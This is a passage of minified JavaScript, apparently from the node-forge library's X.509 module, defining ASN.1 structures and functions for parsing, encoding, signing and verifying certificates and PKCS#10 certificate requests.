s=r.pki.rsa.publicKeyValidator,o={name:"Certificate",tagClass:e.Class.UNIVERSAL,type:e.Type.SEQUENCE,constructed:!0,value:[{name:"Certificate.TBSCertificate",tagClass:e.Class.UNIVERSAL,type:e.Type.SEQUENCE,constructed:!0,captureAsn1:"tbsCertificate",value:[{name:"Certificate.TBSCertificate.version",tagClass:e.Class.CONTEXT_SPECIFIC,type:0,constructed:!0,optional:!0,value:[{name:"Certificate.TBSCertificate.version.integer",tagClass:e.Class.UNIVERSAL,type:e.Type.INTEGER,constructed:!1,capture:"certVersion"}]},{name:"Certificate.TBSCertificate.serialNumber",tagClass:e.Class.UNIVERSAL,type:e.Type.INTEGER,constructed:!1,capture:"certSerialNumber"},{name:"Certificate.TBSCertificate.signature",tagClass:e.Class.UNIVERSAL,type:e.Type.SEQUENCE,constructed:!0,value:[{name:"Certificate.TBSCertificate.signature.algorithm",tagClass:e.Class.UNIVERSAL,type:e.Type.OID,constructed:!1,capture:"certinfoSignatureOid"},{name:"Certificate.TBSCertificate.signature.parameters",tagClass:e.Class.UNIVERSAL,optional:!0,captureAsn1:"certinfoSignatureParams"}]},{name:"Certificate.TBSCertificate.issuer",tagClass:e.Class.UNIVERSAL,type:e.Type.SEQUENCE,constructed:!0,captureAsn1:"certIssuer"},{name:"Certificate.TBSCertificate.validity",tagClass:e.Class.UNIVERSAL,type:e.Type.SEQUENCE,constructed:!0,value:[{name:"Certificate.TBSCertificate.validity.notBefore (utc)",tagClass:e.Class.UNIVERSAL,type:e.Type.UTCTIME,constructed:!1,optional:!0,capture:"certValidity1UTCTime"},{name:"Certificate.TBSCertificate.validity.notBefore (generalized)",tagClass:e.Class.UNIVERSAL,type:e.Type.GENERALIZEDTIME,constructed:!1,optional:!0,capture:"certValidity2GeneralizedTime"},{name:"Certificate.TBSCertificate.validity.notAfter (utc)",tagClass:e.Class.UNIVERSAL,type:e.Type.UTCTIME,constructed:!1,optional:!0,capture:"certValidity3UTCTime"},{name:"Certificate.TBSCertificate.validity.notAfter (generalized)",tagClass:e.Class.UNIVERSAL,type:e.Type.GENERALIZEDTIME,constructed:!1,optional:!0,capture:"certValidity4GeneralizedTime"}]},{name:"Certificate.TBSCertificate.subject",tagClass:e.Class.UNIVERSAL,type:e.Type.SEQUENCE,constructed:!0,captureAsn1:"certSubject"},s,{name:"Certificate.TBSCertificate.issuerUniqueID",tagClass:e.Class.CONTEXT_SPECIFIC,type:1,constructed:!0,optional:!0,value:[{name:"Certificate.TBSCertificate.issuerUniqueID.id",tagClass:e.Class.UNIVERSAL,type:e.Type.BITSTRING,constructed:!1,captureBitStringValue:"certIssuerUniqueId"}]},{name:"Certificate.TBSCertificate.subjectUniqueID",tagClass:e.Class.CONTEXT_SPECIFIC,type:2,constructed:!0,optional:!0,value:[{name:"Certificate.TBSCertificate.subjectUniqueID.id",tagClass:e.Class.UNIVERSAL,type:e.Type.BITSTRING,constructed:!1,captureBitStringValue:"certSubjectUniqueId"}]},{name:"Certificate.TBSCertificate.extensions",tagClass:e.Class.CONTEXT_SPECIFIC,type:3,constructed:!0,captureAsn1:"certExtensions",optional:!0}]},{name:"Certificate.signatureAlgorithm",tagClass:e.Class.UNIVERSAL,type:e.Type.SEQUENCE,constructed:!0,value:[{name:"Certificate.signatureAlgorithm.algorithm",tagClass:e.Class.UNIVERSAL,type:e.Type.OID,constructed:!1,capture:"certSignatureOid"},{name:"Certificate.TBSCertificate.signature.parameters",tagClass:e.Class.UNIVERSAL,optional:!0,captureAsn1:"certSignatureParams"}]},{name:"Certificate.signatureValue",tagClass:e.Class.UNIVERSAL,type:e.Type.BITSTRING,constructed:!1,captureBitStringValue:"certSignature"}]},a={name:"rsapss",tagClass:e.Class.UNIVERSAL,type:e.Type.SEQUENCE,constructed:!0,value:[{name:"rsapss.hashAlgorithm",tagClass:e.Class.CONTEXT_SPECIFIC,type:0,constructed:!0,value:[{name:"rsapss.hashAlgorithm.AlgorithmIdentifier",tagClass:e.Class.UNIVERSAL,type:e.Class.SEQUENCE,constructed:!0,optional:!0,value:[{name:"rsapss.hashAlgorithm.AlgorithmIdentifier.algorithm",tagClass:e.Class.UNIVERSAL,type:e.Type.OID,constructed:!1,capture:"hashOid"}]}]},{name:"rsapss.maskGenAlgorithm",tagClass:e.Class.CONTEXT_SPECIFIC,type:1,constructed:!0,value:[{name:"rsapss.maskGenAlgorithm.AlgorithmIdentifier",tagClass:e.Class.UNIVERSAL,type:e.Class.SEQUENCE,constructed:!0,optional:!0,value:[{name:"rsapss.maskGenAlgorithm.AlgorithmIdentifier.algorithm",tagClass:e.Class.UNIVERSAL,type:e.Type.OID,constructed:!1,capture:"maskGenOid"},{name:"rsapss.maskGenAlgorithm.AlgorithmIdentifier.params",tagClass:e.Class.UNIVERSAL,type:e.Type.SEQUENCE,constructed:!0,value:[{name:"rsapss.maskGenAlgorithm.AlgorithmIdentifier.params.algorithm",tagClass:e.Class.UNIVERSAL,type:e.Type.OID,constructed:!1,capture:"maskGenHashOid"}]}]}]},{name:"rsapss.saltLength",tagClass:e.Class.CONTEXT_SPECIFIC,type:2,optional:!0,value:[{name:"rsapss.saltLength.saltLength",tagClass:e.Class.UNIVERSAL,type:e.Class.INTEGER,constructed:!1,capture:"saltLength"}]},{name:"rsapss.trailerField",tagClass:e.Class.CONTEXT_SPECIFIC,type:3,optional:!0,value:[{name:"rsapss.trailer.trailer",tagClass:e.Class.UNIVERSAL,type:e.Class.INTEGER,constructed:!1,capture:"trailer"}]}]},c={name:"CertificationRequestInfo",tagClass:e.Class.UNIVERSAL,type:e.Type.SEQUENCE,constructed:!0,captureAsn1:"certificationRequestInfo",value:[{name:"CertificationRequestInfo.integer",tagClass:e.Class.UNIVERSAL,type:e.Type.INTEGER,constructed:!1,capture:"certificationRequestInfoVersion"},{name:"CertificationRequestInfo.subject",tagClass:e.Class.UNIVERSAL,type:e.Type.SEQUENCE,constructed:!0,captureAsn1:"certificationRequestInfoSubject"},s,{name:"CertificationRequestInfo.attributes",tagClass:e.Class.CONTEXT_SPECIFIC,type:0,constructed:!0,optional:!0,capture:"certificationRequestInfoAttributes",value:[{name:"CertificationRequestInfo.attributes",tagClass:e.Class.UNIVERSAL,type:e.Type.SEQUENCE,constructed:!0,value:[{name:"CertificationRequestInfo.attributes.type",tagClass:e.Class.UNIVERSAL,type:e.Type.OID,constructed:!1},{name:"CertificationRequestInfo.attributes.value",tagClass:e.Class.UNIVERSAL,type:e.Type.SET,constructed:!0}]}]}]},l={name:"CertificationRequest",tagClass:e.Class.UNIVERSAL,type:e.Type.SEQUENCE,constructed:!0,captureAsn1:"csr",value:[c,{name:"CertificationRequest.signatureAlgorithm",tagClass:e.Class.UNIVERSAL,type:e.Type.SEQUENCE,constructed:!0,value:[{name:"CertificationRequest.signatureAlgorithm.algorithm",tagClass:e.Class.UNIVERSAL,type:e.Type.OID,constructed:!1,capture:"csrSignatureOid"},{name:"CertificationRequest.signatureAlgorithm.parameters",tagClass:e.Class.UNIVERSAL,optional:!0,captureAsn1:"csrSignatureParams"}]},{name:"CertificationRequest.signature",tagClass:e.Class.UNIVERSAL,type:e.Type.BITSTRING,constructed:!1,captureBitStringValue:"csrSignature"}]};t.RDNAttributesAsArray=function(I,E){for(var C=[],N,L,$,y=0;y<I.value.length;++y){N=I.value[y];for(var A=0;A<N.value.length;++A)$={},L=N.value[A],$.type=e.derToOid(L.value[0].value),$.value=L.value[1].value,$.valueTagClass=L.value[1].type,$.type in i&&($.name=i[$.type],$.name in n&&($.shortName=n[$.name])),E&&(E.update($.type),E.update($.value)),C.push($)}return C},t.CRIAttributesAsArray=function(I){for(var E=[],C=0;C<I.length;++C)for(var N=I[C],L=e.derToOid(N.value[0].value),$=N.value[1].value,y=0;y<$.length;++y){var A={};if(A.type=L,A.value=$[y].value,A.valueTagClass=$[y].type,A.type in i&&(A.name=i[A.type],A.name in n&&(A.shortName=n[A.name])),A.type===i.extensionRequest){A.extensions=[];for(var b=0;b<A.value.length;++b)A.extensions.push(t.certificateExtensionFromAsn1(A.value[b]))}E.push(A)}return E};function u(I,E){typeof E=="string"&&(E={shortName:E});for(var C=null,N,L=0;C===null&&L<I.attributes.length;++L)N=I.attributes[L],(E.type&&E.type===N.type||E.name&&E.name===N.name||E.shortName&&E.shortName===N.shortName)&&(C=N);return C}var d=function(I,E,C){var N={};if(I!==i["RSASSA-PSS"])return N;C&&(N={hash:{algorithmOid:i.sha1},mgf:{algorithmOid:i.mgf1,hash:{algorithmOid:i.sha1}},saltLength:20});var L={},$=[];if(!e.validate(E,a,L,$)){var y=new Error("Cannot read RSASSA-PSS parameter block.");throw y.errors=$,y}return L.hashOid!==void 0&&(N.hash=N.hash||{},N.hash.algorithmOid=e.derToOid(L.hashOid)),L.maskGenOid!==void 0&&(N.mgf=N.mgf||{},N.mgf.algorithmOid=e.derToOid(L.maskGenOid),N.mgf.hash=N.mgf.hash||{},N.mgf.hash.algorithmOid=e.derToOid(L.maskGenHashOid)),L.saltLength!==void 0&&(N.saltLength=L.saltLength.charCodeAt(0)),N},h=function(I){switch(i[I.signatureOid]){case"sha1WithRSAEncryption":case"sha1WithRSASignature":return r.md.sha1.create();case"md5WithRSAEncryption":return r.md.md5.create();case"sha256WithRSAEncryption":return r.md.sha256.create();case"sha384WithRSAEncryption":return r.md.sha384.create();case"sha512WithRSAEncryption":return r.md.sha512.create();case"RSASSA-PSS":return r.md.sha256.create();default:var E=new Error("Could not compute "+I.type+" digest. Unknown signature OID.");throw E.signatureOid=I.signatureOid,E}},f=function(I){var E=I.certificate,C;switch(E.signatureOid){case i.sha1WithRSAEncryption:case i.sha1WithRSASignature:break;case i["RSASSA-PSS"]:var N,L;if(N=i[E.signatureParameters.mgf.hash.algorithmOid],N===void 0||r.md[N]===void 0){var $=new Error("Unsupported MGF hash function.");throw $.oid=E.signatureParameters.mgf.hash.algorithmOid,$.name=N,$}if(L=i[E.signatureParameters.mgf.algorithmOid],L===void 0||r.mgf[L]===void 0){var $=new Error("Unsupported MGF function.");throw $.oid=E.signatureParameters.mgf.algorithmOid,$.name=L,$}if(L=r.mgf[L].create(r.md[N].create()),N=i[E.signatureParameters.hash.algorithmOid],N===void 0||r.md[N]===void 0){var $=new Error("Unsupported RSASSA-PSS hash function.");throw $.oid=E.signatureParameters.hash.algorithmOid,$.name=N,$}C=r.pss.create(r.md[N].create(),L,E.signatureParameters.saltLength);break}return E.publicKey.verify(I.md.digest().getBytes(),I.signature,C)};t.certificateFromPem=function(I,E,C){var N=r.pem.decode(I)[0];if(N.type!=="CERTIFICATE"&&N.type!=="X509 CERTIFICATE"&&N.type!=="TRUSTED CERTIFICATE"){var L=new Error('Could not convert certificate from PEM; PEM header type is not "CERTIFICATE", "X509 CERTIFICATE", or "TRUSTED CERTIFICATE".');throw L.headerType=N.type,L}if(N.procType&&N.procType.type==="ENCRYPTED")throw new Error("Could not convert certificate from PEM; PEM is encrypted.");var $=e.fromDer(N.body,C);return t.certificateFromAsn1($,E)},t.certificateToPem=function(I,E){var C={type:"CERTIFICATE",body:e.toDer(t.certificateToAsn1(I)).getBytes()};return r.pem.encode(C,{maxline:E})},t.publicKeyFromPem=function(I){var E=r.pem.decode(I)[0];if(E.type!=="PUBLIC KEY"&&E.type!=="RSA PUBLIC KEY"){var C=new Error('Could not convert public key from PEM; PEM header type is not "PUBLIC KEY" or "RSA PUBLIC KEY".');throw C.headerType=E.type,C}if(E.procType&&E.procType.type==="ENCRYPTED")throw new Error("Could not convert public key from PEM; PEM is encrypted.");var N=e.fromDer(E.body);return t.publicKeyFromAsn1(N)},t.publicKeyToPem=function(I,E){var C={type:"PUBLIC KEY",body:e.toDer(t.publicKeyToAsn1(I)).getBytes()};return r.pem.encode(C,{maxline:E})},t.publicKeyToRSAPublicKeyPem=function(I,E){var C={type:"RSA PUBLIC KEY",body:e.toDer(t.publicKeyToRSAPublicKey(I)).getBytes()};return r.pem.encode(C,{maxline:E})},t.getPublicKeyFingerprint=function(I,E){E=E||{};var C=E.md||r.md.sha1.create(),N=E.type||"RSAPublicKey",L;switch(N){case"RSAPublicKey":L=e.toDer(t.publicKeyToRSAPublicKey(I)).getBytes();break;case"SubjectPublicKeyInfo":L=e.toDer(t.publicKeyToAsn1(I)).getBytes();break;default:throw new Error('Unknown fingerprint type "'+E.type+'".')}C.start(),C.update(L);var $=C.digest();if(E.encoding==="hex"){var y=$.toHex();return E.delimiter?y.match(/.{2}/g).join(E.delimiter):y}else{if(E.encoding==="binary")return $.getBytes();if(E.encoding)throw new Error('Unknown encoding "'+E.encoding+'".')}return $},t.certificationRequestFromPem=function(I,E,C){var N=r.pem.decode(I)[0];if(N.type!=="CERTIFICATE REQUEST"){var L=new Error('Could not convert certification request from PEM; PEM header type is not "CERTIFICATE REQUEST".');throw L.headerType=N.type,L}if(N.procType&&N.procType.type==="ENCRYPTED")throw new Error("Could not convert certification request from PEM; PEM is encrypted.");var $=e.fromDer(N.body,C);return t.certificationRequestFromAsn1($,E)},t.certificationRequestToPem=function(I,E){var C={type:"CERTIFICATE REQUEST",body:e.toDer(t.certificationRequestToAsn1(I)).getBytes()};return r.pem.encode(C,{maxline:E})},t.createCertificate=function(){var I={};return I.version=2,I.serialNumber="00",I.signatureOid=null,I.signature=null,I.siginfo={},I.siginfo.algorithmOid=null,I.validity={},I.validity.notBefore=new Date,I.validity.notAfter=new Date,I.issuer={},I.issuer.getField=function(E){return u(I.issuer,E)},I.issuer.addField=function(E){g([E]),I.issuer.attributes.push(E)},I.issuer.attributes=[],I.issuer.hash=null,I.subject={},I.subject.getField=function(E){return u(I.subject,E)},I.subject.addField=function(E){g([E]),I.subject.attributes.push(E)},I.subject.attributes=[],I.subject.hash=null,I.extensions=[],I.publicKey=null,I.md=null,I.setSubject=function(E,C){g(E),I.subject.attributes=E,delete I.subject.uniqueId,C&&(I.subject.uniqueId=C),I.subject.hash=null},I.setIssuer=function(E,C){g(E),I.issuer.attributes=E,delete I.issuer.uniqueId,C&&(I.issuer.uniqueId=C),I.issuer.hash=null},I.setExtensions=function(E){for(var C=0;C<E.length;++C)w(E[C],{cert:I});I.extensions=E},I.getExtension=function(E){typeof E=="string"&&(E={name:E});for(var C=null,N,L=0;C===null&&L<I.extensions.length;++L)N=I.extensions[L],(E.id&&N.id===E.id||E.name&&N.name===E.name)&&(C=N);return C},I.sign=function(E,C){I.md=C||r.md.sha1.create();var N=i[I.md.algorithm+"WithRSAEncryption"];if(!N){var L=new Error("Could not compute certificate digest. Unknown message digest algorithm OID.");throw L.algorithm=I.md.algorithm,L}I.signatureOid=I.siginfo.algorithmOid=N,I.tbsCertificate=t.getTBSCertificate(I);var $=e.toDer(I.tbsCertificate);I.md.update($.getBytes()),I.signature=E.sign(I.md)},I.verify=function(E){var C=!1;if(!I.issued(E)){var N=E.issuer,L=I.subject,$=new Error("The parent certificate did not issue the given child certificate; the child certificate's issuer does not match the parent's subject.");throw $.expectedIssuer=L.attributes,$.actualIssuer=N.attributes,$}var y=E.md;if(y===null){y=h({signatureOid:E.signatureOid,type:"certificate"});var A=E.tbsCertificate||t.getTBSCertificate(E),b=e.toDer(A);y.update(b.getBytes())}return y!==null&&(C=f({certificate:I,md:y,signature:E.signature})),C},I.isIssuer=function(E){var C=!1,N=I.issuer,L=E.subject;if(N.hash&&L.hash)C=N.hash===L.hash;else if(N.attributes.length===L.attributes.length){C=!0;for(var $,y,A=0;C&&A<N.attributes.length;++A)$=N.attributes[A],y=L.attributes[A],($.type!==y.type||$.value!==y.value)&&(C=!1)}return C},I.issued=function(E){return E.isIssuer(I)},I.generateSubjectKeyIdentifier=function(){return t.getPublicKeyFingerprint(I.publicKey,{type:"RSAPublicKey"})},I.verifySubjectKeyIdentifier=function(){for(var E=i.subjectKeyIdentifier,C=0;C<I.extensions.length;++C){var N=I.extensions[C];if(N.id===E){var L=I.generateSubjectKeyIdentifier().getBytes();return r.util.hexToBytes(N.subjectKeyIdentifier)===L}}return!1},I},t.certificateFromAsn1=function(I,E){var C={},N=[];if(!e.validate(I,o,C,N)){var L=new Error("Cannot read X.509 certificate. ASN.1 object is not an X509v3 Certificate.");throw L.errors=N,L}var $=e.derToOid(C.publicKeyOid);if($!==t.oids.rsaEncryption)throw new Error("Cannot read public key. OID is not RSA.");var y=t.createCertificate();y.version=C.certVersion?C.certVersion.charCodeAt(0):0;var A=r.util.createBuffer(C.certSerialNumber);y.serialNumber=A.toHex(),y.signatureOid=r.asn1.derToOid(C.certSignatureOid),y.signatureParameters=d(y.signatureOid,C.certSignatureParams,!0),y.siginfo.algorithmOid=r.asn1.derToOid(C.certinfoSignatureOid),y.siginfo.parameters=d(y.siginfo.algorithmOid,C.certinfoSignatureParams,!1),y.signature=C.certSignature;var b=[];if(C.certValidity1UTCTime!==void 0&&b.push(e.utcTimeToDate(C.certValidity1UTCTime)),C.certValidity2GeneralizedTime!==void 0&&b.push(e.generalizedTimeToDate(C.certValidity2GeneralizedTime)),C.certValidity3UTCTime!==void 0&&b.push(e.utcTimeToDate(C.certValidity3UTCTime)),C.certValidity4GeneralizedTime!==void 0&&b.push(e.generalizedTimeToDate(C.certValidity4GeneralizedTime)),b.length>2)throw new Error("Cannot read notBefore/notAfter validity times; more than two times were provided in the certificate.");if(b.length<2)throw new Error("Cannot read notBefore/notAfter validity times; they were not provided as either UTCTime or GeneralizedTime.");if(y.validity.notBefore=b[0],y.validity.notAfter=b[1],y.tbsCertificate=C.tbsCertificate,E){y.md=h({signatureOid:y.signatureOid,type:"certificate"});var v=e.toDer(y.tbsCertificate);y.md.update(v.getBytes())}var _=r.md.sha1.create(),O=e.toDer(C.certIssuer);_.update(O.getBytes()),y.issuer.getField=function(P){return u(y.issuer,P)},y.issuer.addField=function(P){g([P]),y.issuer.attributes.push(P)},y.issuer.attributes=t.RDNAttributesAsArray(C.certIssuer),C.certIssuerUniqueId&&(y.issuer.uniqueId=C.certIssuerUniqueId),y.issuer.hash=_.digest().toHex();var D=r.md.sha1.create(),R=e.toDer(C.certSubject);return D.update(R.getBytes()),y.subject.getField=function(P){return u(y.subject,P)},y.subject.addField=function(P){g([P]),y.subject.attributes.push(P)},y.subject.attributes=t.RDNAttributesAsArray(C.certSubject),C.certSubjectUniqueId&&(y.subject.uniqueId=C.certSubjectUniqueId),y.subject.hash=D.digest().toHex(),C.certExtensions?y.extensions=t.certificateExtensionsFromAsn1(C.certExtensions):y.extensions=[],y.publicKey=t.publicKeyFromAsn1(C.subjectPublicKeyInfo),y},t.certificateExtensionsFromAsn1=function(I){for(var E=[],C=0;C<I.value.length;++C)for(var N=I.value[C],L=0;L<N.value.length;++L)E.push(t.certificateExtensionFromAsn1(N.value[L]));return E},t.certificateExtensionFromAsn1=function(I){var E={};if(E.id=e.derToOid(I.value[0].value),E.critical=!1,I.value[1].type===e.Type.BOOLEAN?(E.critical=I.value[1].value.charCodeAt(0)!==0,E.value=I.value[2].value):E.value=I.value[1].value,E.id in i){if(E.name=i[E.id],E.name==="keyUsage"){var C=e.fromDer(E.value),N=0,L=0;C.value.length>1&&(N=C.value.charCodeAt(1),L=C.value.length>2?C.value.charCodeAt(2):0),E.digitalSignature=(N&128)===128,E.nonRepudiation=(N&64)===64,E.keyEncipherment=(N&32)===32,E.dataEncipherment=(N&16)===16,E.keyAgreement=(N&8)===8,E.keyCertSign=(N&4)===4,E.cRLSign=(N&2)===2,E.encipherOnly=(N&1)===1,E.decipherOnly=(L&128)===128}else if(E.name==="basicConstraints"){var C=e.fromDer(E.value);C.value.length>0&&C.value[0].type===e.Type.BOOLEAN?E.cA=C.value[0].value.charCodeAt(0)!==0:E.cA=!1;var $=null;C.value.length>0&&C.value[0].type===e.Type.INTEGER?$=C.value[0].value:C.value.length>1&&($=C.value[1].value),$!==null&&(E.pathLenConstraint=e.derToInteger($))}else if(E.name==="extKeyUsage")for(var C=e.fromDer(E.value),y=0;y<C.value.length;++y){var A=e.derToOid(C.value[y].value);A in i?E[i[A]]=!0:E[A]=!0}else if(E.name==="nsCertType"){var C=e.fromDer(E.value),N=0;C.value.length>1&&(N=C.value.charCodeAt(1)),E.client=(N&128)===128,E.server=(N&64)===64,E.email=(N&32)===32,E.objsign=(N&16)===16,E.reserved=(N&8)===8,E.sslCA=(N&4)===4,E.emailCA=(N&2)===2,E.objCA=(N&1)===1}else if(E.name==="subjectAltName"||E.name==="issuerAltName"){E.altNames=[];for(var b,C=e.fromDer(E.value),v=0;v<C.value.length;++v){b=C.value[v];var _={type:b.type,value:b.value};switch(E.altNames.push(_),b.type){case 1:case 2:case 6:break;case 7:_.ip=r.util.bytesToIP(b.value);break;case 8:_.oid=e.derToOid(b.value);break}}}else if(E.name==="subjectKeyIdentifier"){var C=e.fromDer(E.value);E.subjectKeyIdentifier=r.util.bytesToHex(C.value)}}return E},t.certificationRequestFromAsn1=function(I,E){var C={},N=[];if(!e.validate(I,l,C,N)){var L=new Error("Cannot read PKCS#10 certificate request. ASN.1 object is not a PKCS#10 CertificationRequest.");throw L.errors=N,L}var $=e.derToOid(C.publicKeyOid);if($!==t.oids.rsaEncryption)throw new Error("Cannot read public key. OID is not RSA.");var y=t.createCertificationRequest();if(y.version=C.csrVersion?C.csrVersion.charCodeAt(0):0,y.signatureOid=r.asn1.derToOid(C.csrSignatureOid),y.signatureParameters=d(y.signatureOid,C.csrSignatureParams,!0),y.siginfo.algorithmOid=r.asn1.derToOid(C.csrSignatureOid),y.siginfo.parameters=d(y.siginfo.algorithmOid,C.csrSignatureParams,!1),y.signature=C.csrSignature,y.certificationRequestInfo=C.certificationRequestInfo,E){y.md=h({signatureOid:y.signatureOid,type:"certification request"});var A=e.toDer(y.certificationRequestInfo);y.md.update(A.getBytes())}var b=r.md.sha1.create();return y.subject.getField=function(v){return u(y.subject,v)},y.subject.addField=function(v){g([v]),y.subject.attributes.push(v)},y.subject.attributes=t.RDNAttributesAsArray(C.certificationRequestInfoSubject,b),y.subject.hash=b.digest().toHex(),y.publicKey=t.publicKeyFromAsn1(C.subjectPublicKeyInfo),y.getAttribute=function(v){return u(y,v)},y.addAttribute=function(v){g([v]),y.attributes.push(v)},y.attributes=t.CRIAttributesAsArray(C.certificationRequestInfoAttributes||[]),y},t.createCertificationRequest=function(){var I={};return I.version=0,I.signatureOid=null,I.signature=null,I.siginfo={},I.siginfo.algorithmOid=null,I.subject={},I.subject.getField=function(E){return u(I.subject,E)},I.subject.addField=function(E){g([E]),I.subject.attributes.push(E)},I.subject.attributes=[],I.subject.hash=null,I.publicKey=null,I.attributes=[],I.getAttribute=function(E){return u(I,E)},I.addAttribute=function(E){g([E]),I.attributes.push(E)},I.md=null,I.setSubject=function(E){g(E),I.subject.attributes=E,I.subject.hash=null},I.setAttributes=function(E){g(E),I.attributes=E},I.sign=function(E,C){I.md=C||r.md.sha1.create();var N=i[I.md.algorithm+"WithRSAEncryption"];if(!N){var L=new Error("Could not compute certification request digest. Unknown message digest algorithm OID.");throw L.algorithm=I.md.algorithm,L}I.signatureOid=I.siginfo.algorithmOid=N,I.certificationRequestInfo=t.getCertificationRequestInfo(I);var $=e.toDer(I.certificationRequestInfo);I.md.update($.getBytes()),I.signature=E.sign(I.md)},I.verify=function(){var E=!1,C=I.md;if(C===null){C=h({signatureOid:I.signatureOid,type:"certification request"});var N=I.certificationRequestInfo||t.getCertificationRequestInfo(I),L=e.toDer(N);C.update(L.getBytes())}return C!==null&&(E=f({certificate:I,md:C,signature:I.signature})),E},I};function p(I){for(var E=e.create(e.Class.UNIVERSAL,e.Type.SEQUENCE,!0,[]),C,N,L=I.attributes,$=0;$<L.length;++$){C=L[$];var y=C.value,A=e.Type.PRINTABLESTRING;"valueTagClass"in C&&(A=C.valueTagClass,A===e.Type.UTF8&&(y=r.util.encodeUtf8(y))),N=e.create(e.Class.UNIVERSAL,e.Type.SET,!0,[e.create(e.Class.UNIVERSAL,e.Type.SEQUENCE,!0,[e.create(e.Class.UNIVERSAL,e.Type.OID,!1,e.oidToDer(C.type).getBytes()),e.create(e.Class.UNIVERSAL,A,!1,y)])]),E.value.push(N)}return E}function g(I){for(var E,C=0;C<I.length;++C){if(E=I[C],typeof E.name>"u"&&(E.type&&E.type in t.oids?E.name=t.oids[E.type]:E.shortName&&E.shortName in n&&(E.name=t.oids[n[E.shortName]])),typeof E.type>"u")if(E.name&&E.name in t.oids)E.type=t.oids[E.name];else{var N=new Error("Attribute type not specified.");throw N.attribute=E,N}if(typeof E.shortName>"u"&&E.name&&E.name in n&&(E.shortName=n[E.name]),E.type===i.extensionRequest&&(E.valueConstructed=!0,E.valueTagClass=e.Type.SEQUENCE,!E.value&&E.extensions)){E.value=[];for(var L=0;L<E.extensions.length;++L)E.value.push(t.certificateExtensionToAsn1(w(E.extensions[L])))}if(typeof E.value>"u"){var N=new Error("Attribute value not specified.");throw N.attribute=E,N}}}function w(I,E){if(E=E||{},typeof I.name>"u"&&I.id&&I.id in t.oids&&(I.name=t.oids[I.id]),typeof I.id>"u")if(I.name&&I.name in t.oids)I.id=t.oids[I.name];else{var C=new Error("Extension ID not specified.");throw C.extension=I,C}if(typeof I.value<"u")return I;if(I.name==="keyUsage"){var N=0,L=0,$=0;I.digitalSignature&&(L|=128,N=7),I.nonRepudiation&&(L|=64,N=6),I.keyEncipherment&&(L|=32,N=5),I.dataEncipherment&&(L|=16,N=4),I.keyAgreement&&(L|=8,N=3),I.keyCertSign&&(L|=4,N=2),I.cRLSign&&(L|=2,N=1),I.encipherOnly&&(L|=1,N=0),I.decipherOnly&&($|=128,N=7);var y=String.fromCharCode(N);$!==0?y+=String.fromCharCode(L)+String.fromCharCode($):L!==0&&(y+=String.fromCharCode(L)),I.value=e.create(e.Class.UNIVERSAL,e.Type.BITSTRING,!1,y)}else if(I.name==="basicConstraints")I.value=e.create(e.Class.UNIVERSAL,e.Type.SEQUENCE,!0,[]),I.cA&&I.value.value.push(e.create(e.Class.UNIVERSAL,e.Type.BOOLEAN,!1,"")),"pathLenConstraint"in I&&I.value.value.push(e.create(e.Class.UNIVERSAL,e.Type.INTEGER,!1,e.integerToDer(I.pathLenConstraint).getBytes()));else if(I.name==="extKeyUsage"){I.value=e.create(e.Class.UNIVERSAL,e.Type.SEQUENCE,!0,[]);var A=I.value.value;for(var b in I)I[b]===!0&&(b in i?A.push(e.create(e.Class.UNIVERSAL,e.Type.OID,!1,e.oidToDer(i[b]).getBytes())):b.indexOf(".")!==-1&&A.push(e.create(e.Class.UNIVERSAL,e.Type.OID,!1,e.oidToDer(b).getBytes())))}else if(I.name==="nsCertType"){var N=0,L=0;I.client&&(L|=128,N=7),I.server&&(L|=64,N=6),I.email&&(L|=32,N=5),I.objsign&&(L|=16,N=4),I.reserved&&(L|=8,N=3),I.sslCA&&(L|=4,N=2),I.emailCA&&(L|=2,N=1),I.objCA&&(L|=1,N=0);var y=String.fromCharCode(N);L!==0&&(y+=String.fromCharCode(L)),I.value=e.create(e.Class.UNIVERSAL,e.Type.BITSTRING,!1,y)}else if(I.name==="subjectAltName"||I.name==="issuerAltName"){I.value=e.create(e.Class.UNIVERSAL,e.Type.SEQUENCE,!0,[]);for(var v,_=0;_<I.altNames.length;++_){v=I.altNames[_];var y=v.value;if(v.type===7&&v.ip){if(y=r.util.bytesFromIP(v.ip),y===null){var C=new Error('Extension "ip" value is not a valid IPv4 or IPv6 address.');throw C.extension=I,C}}else v.type===8&&(v.oid?y=e.oidToDer(e.oidToDer(v.oid)):y=e.oidToDer(y));I.value.value.push(e.create(e.Class.CONTEXT_SPECIFIC,v.type,!1,y))}}else if(I.name==="nsComment"&&E.cert){if(!/^[\x00-\x7F]*$/.test(I.comment)||I.comment.length<1||I.comment.length>128)throw new Error('Invalid "nsComment" content.');I.value=e.create(e.Class.UNIVERSAL,e.Type.IA5STRING,!1,I.comment)}else if(I.name==="subjectKeyIdentifier"&&E.cert){var O=E.cert.generateSubjectKeyIdentifier();I.subjectKeyIdentifier=O.toHex(),I.value=e.create(e.Class.UNIVERSAL,e.Type.OCTETSTRING,!1,O.getBytes())}else if(I.name==="authorityKeyIdentifier"&&E.cert){I.value=e.create(e.Class.UNIVERSAL,e.Type.SEQUENCE,!0,[]);var A=I.value.value;if(I.keyIdentifier){var D=I.keyIdentifier===!0?E.cert.generateSubjectKeyIdentifier().getBytes():I.keyIdentifier;A.push(e.create(e.Class.CONTEXT_SPECIFIC,0,!1,D))}if(I.authorityCertIssuer){var R=[e.create(e.Class.CONTEXT_SPECIFIC,4,!0,[p(I.authorityCertIssuer===!0?E.cert.issuer:I.authorityCertIssuer)])];A.push(e.create(e.Class.CONTEXT_SPECIFIC,1,!0,R))}if(I.serialNumber){var P=r.util.hexToBytes(I.serialNumber===!0?E.cert.serialNumber:I.serialNumber);A.push(e.create(e.Class.CONTEXT_SPECIFIC,2,!1,P))}}else if(I.name==="cRLDistributionPoints"){I.value=e.create(e.Class.UNIVERSAL,e.Type.SEQUENCE,!0,[]);for(var A=I.value.value,B=e.create(e.Class.UNIVERSAL,e.Type.SEQUENCE,!0,[]),M=e.create(e.Class.CONTEXT_SPECIFIC,0,!0,[]),v,_=0;_<I.altNames.length;++_){v=I.altNames[_];var y=v.value;if(v.type===7&&v.ip){if(y=r.util.bytesFromIP(v.ip),y===null){var C=new Error('Extension "ip" value is not a valid IPv4 or IPv6 address.');throw C.extension=I,C}}else v.type===8&&(v.oid?y=e.oidToDer(e.oidToDer(v.oid)):y=e.oidToDer(y));M.value.push(e.create(e.Class.CONTEXT_SPECIFIC,v.type,!1,y))}B.value.push(e.create(e.Class.CONTEXT_SPECIFIC,0,!0,[M])),A.push(B)}if(typeof I.value>"u"){var C=new Error("Extension value not specified.");throw C.extension=I,C}return I}function m(I,E){switch(I){case 